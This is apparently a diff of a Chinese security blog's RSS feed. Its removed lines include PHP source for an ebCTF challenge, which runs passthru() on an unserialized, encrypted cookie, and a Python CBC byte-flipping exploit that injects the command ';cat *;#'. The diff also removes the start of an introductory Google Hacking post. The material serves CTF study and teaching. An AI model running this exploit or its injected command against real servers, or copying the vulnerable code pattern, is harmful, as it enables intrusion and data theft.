-&lt;span class=&quot;x&quot;&gt;            return hash_hmac(&amp;#39;sha1&amp;#39;, data, MY_HMAC_KEY);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        function encrypt($data) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            return aes($data . hmac($data), true);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        function decrypt($data) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            $data = rtrim(aes($data, false), &amp;quot;\0&amp;quot;);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            $mac = substr($data, -MY_MAC_LEN);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            $data = substr($data, 0, -MY_MAC_LEN);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            return hmac($data) === $mac ? $data : null;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        $settings = array();&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        if (@$_COOKIE[&amp;#39;settings&amp;#39;]) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;                echo @decrypt(base64_decode($_COOKIE[&amp;#39;settings&amp;#39;]));&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;                $settings = unserialize(@decrypt(base64_decode($_COOKIE[&amp;#39;settings&amp;#39;])));&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        if (@$_POST[&amp;#39;name&amp;#39;] &amp;amp;&amp;amp; is_string($_POST[&amp;#39;name&amp;#39;]) &amp;amp;&amp;amp; strlen($_POST[&amp;#39;name&amp;#39;]) &amp;lt; 200) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            $settings = array(&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;                    &amp;#39;name&amp;#39; =&amp;gt; $_POST[&amp;#39;name&amp;#39;],&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;                    &amp;#39;greeting&amp;#39; =&amp;gt; (&amp;#39;echo &amp;#39; . escapeshellarg(&amp;quot;Hello {$_POST[&amp;#39;name&amp;#39;]}!&amp;quot;)),&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            );&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            setcookie(&amp;#39;settings&amp;#39;, base64_encode(@encrypt(serialize($settings))));&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            #setcookie(&amp;#39;settings&amp;#39;, serialize($settings));&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        $d = array();&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        if (@$settings[&amp;#39;greeting&amp;#39;]) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            passthru($settings[&amp;#39;greeting&amp;#39;]);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        else {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            echo &amp;quot;&amp;lt;/pre&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        &amp;lt;form action=&amp;quot;\&amp;amp;quot;?\&amp;amp;quot;&amp;quot; method=&amp;quot;\&amp;amp;quot;POST\&amp;amp;quot;&amp;quot;&amp;gt;\n&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         echo &amp;quot;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        What is your name?&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        \n&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         echo &amp;quot;&amp;lt;input type=&amp;quot;\&amp;amp;quot;text\&amp;amp;quot;&amp;quot; name=&amp;quot;\&amp;amp;quot;name\&amp;amp;quot;&amp;quot; /&amp;gt;\n&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         echo &amp;quot;&amp;lt;input type=&amp;quot;\&amp;amp;quot;submit\&amp;amp;quot;&amp;quot; name=&amp;quot;\&amp;amp;quot;submit\&amp;amp;quot;&amp;quot; value=&amp;quot;\&amp;amp;quot;Submit\&amp;amp;quot;&amp;quot; /&amp;gt;\n&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         echo &amp;quot;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        &amp;lt;pre&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        \n&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Exploit:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
-        &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-        &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-        &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;
-        &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;
-        &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;
-         
-        &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;http://192.168.184.133/ebctf/mine.php&amp;#39;&lt;/span&gt;
-         
-        &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;echo &amp;#39;Hello &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;a:2:{s:4:&amp;quot;name&amp;quot;;s:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;;s:8:&amp;quot;greeting&amp;quot;;s:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;;}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;X&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;
-         
-        &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;settings&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
-         &lt;span class=&quot;c&quot;&gt;#   if req.find(&amp;#39;works&amp;#39;) != -1:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;
-          &lt;span class=&quot;c&quot;&gt;#  else:&lt;/span&gt;
-           &lt;span class=&quot;c&quot;&gt;#     print &amp;#39;[-] FAIL&amp;#39;&lt;/span&gt;
-         
-        &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;s&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                &lt;span class=&quot;s&quot;&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;Submit&amp;#39;&lt;/span&gt;
-            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;set-cookie&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unquote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;set-cookie&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]))&lt;/span&gt;
-                &lt;span class=&quot;c&quot;&gt;#h = urllib.unquote_plus(h[&amp;#39;set-cookie&amp;#39;][9:])&lt;/span&gt;
-                &lt;span class=&quot;c&quot;&gt;#print h&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;[-] ERROR&amp;#39;&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-         
-        &lt;span class=&quot;c&quot;&gt;#a:2:{s:4:&amp;quot;name&amp;quot;;s:10:&amp;quot;X;cat *;#a&amp;quot;;s:8:&amp;quot;greeting&amp;quot;;s:24:&amp;quot;echo &amp;#39;Hello X;cat *;#a!&amp;#39;&amp;quot;;}&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#a:2:{s:4:&amp;quot;name&amp;quot;;&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#s:10:&amp;quot;X;cat *;#a&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#&amp;quot;;s:8:&amp;quot;greeting&amp;quot;&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#;s:24:&amp;quot;echo &amp;#39;Hel&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#lo X;cat *;#a!&amp;#39;&amp;quot;&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#;}&lt;/span&gt;
-         
-        &lt;span class=&quot;c&quot;&gt;#a:2:{s:4:&amp;quot;name&amp;quot;;s:42:&amp;quot;zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz&amp;quot;;s:8:&amp;quot;greeting&amp;quot;;s:56:&amp;quot;echo &amp;#39;Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!&amp;#39;&amp;quot;;}&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#a:2:{s:4:&amp;quot;name&amp;quot;;&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#s:42:&amp;quot;zzzzzzzzzz&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#zzzzzzzX;cat *;#&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#zzzzzzzzzzzzzzzz&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#&amp;quot;;s:8:&amp;quot;greeting&amp;quot;&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#;s:56:&amp;quot;echo &amp;#39;Hel&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#lo zzzzzzzzzzzzz&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#zzzzX;cat *;#zzz&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#zzzzzzzzzzzzz!&amp;#39;&amp;quot;&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#;}&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#exploit = &amp;#39;X&amp;#39; + &amp;#39;;cat *;#a&amp;#39; #Test case first, unsuccess&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;X&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;;cat *;#&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;z&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Test Success&lt;/span&gt;
-         
-        &lt;span class=&quot;c&quot;&gt;#exploit = &amp;quot;______________________________________________________; cat *;#&amp;quot;&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#Test(exploit)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#test case success&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;#pos = 51; #test case first, unsuccess&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;X&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 译者前言&lt;/h1&gt;
 
 </description>
+        
         <pubDate>Sun, 09 Aug 2015 02:30:00 +0800</pubDate>
-        <link>/studying/2015/08/09/cbc-byte-flipping-attack-101-approach-studying.html</link>
-        <guid isPermaLink="true">/studying/2015/08/09/cbc-byte-flipping-attack-101-approach-studying.html</guid>
-        
-        
-        <category>studying</category>
-        
+        <link>
+        /cbc-byte-flipping-attack-101-approach-studying.html</link>
+        <guid isPermaLink="true">/cbc-byte-flipping-attack-101-approach-studying.html</guid>
       </item>
+      
     
+      
       <item>
         <title>基础级Google Hacking</title>
-        <description>&lt;p&gt;##0x00 引言 ##&lt;/p&gt;
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 引言&lt;/h1&gt;
 
-&lt;p&gt;“无用信息输入，无用信息输出”，本文适当总结脚本小子的Google Hacking方法未涉及脚本自动化处理数据，翻墙请自备，大神请轻喷。鄙人觉得也应当配合不同的搜索引擎使用相应的搜索语法组合出最佳的结果，当然可以由自动化工具实现或学习相关*HDB进行手工搜索。(下文中“===”代表搜索结果相同)&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;p&gt;##0x01 Google搜索基础知识 ##&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;手气不错，自定义搜索结果，语言设置，高级设置大家都懂哈 &lt;br /&gt;
-&lt;img src=&quot;/assets/images/20150328/1.png&quot; alt=&quot;Example&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;基本搜素：一个或一组单词(google hacker);双引号封装的词组(“Google Hacking”)&lt;/li&gt;
-  &lt;li&gt;Google搜索的黄金法则：
-    &lt;ul&gt;
-      &lt;li&gt;Google查询不区分大小写：hack === HAck 但单词or作为布尔操作符时必须为大写就，即OR&lt;/li&gt;
-      &lt;li&gt;Google通配符：星号(*)仅代表搜索词组中的一个词。（注意与表示任意单一字母的词干提取技术相区别）&lt;/li&gt;
-      &lt;li&gt;Google保留忽略查询关键字的权利(哪些关键字会被忽略呢 &lt;a href=&quot;https://code.google.com/p/stop-words/&quot;&gt;Link&lt;/a&gt;):(how 1 = WHERE 4) === (1 = WHERE 4) 两者搜索结果相同。如何突破？搜索”how” 1 = WHERE 4即可&lt;/li&gt;
-      &lt;li&gt;32个单词的限制：突破方法：使用通配符(*)来代替某些单词。Google不认为通配符是一个查询项，这使得我们能够稍稍扩展查询.&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;使用布尔操作符和特殊字符：
-    &lt;ul&gt;
-      &lt;li&gt;AND：用于在查询中包含多个关键字。例如：hacker AND cracker。但AND关键字对于Google来说是多余的。默认情况下，Google会自动搜索查询中的所有关键字。加号(+)强制Google搜索它后面的单词。在加号后面不得有空格，用于强制搜索被忽略的单词，例如：+and justice for +all。当然，也可以使用双引号构建查询，即”and justice for all”&lt;/li&gt;
-      &lt;li&gt;NOT：用于在查询中忽略一个单词。也可以使用减号(-)达到相应效果，在减号和搜索关键字之间不能有空格。例如：hacker -golf&lt;/li&gt;
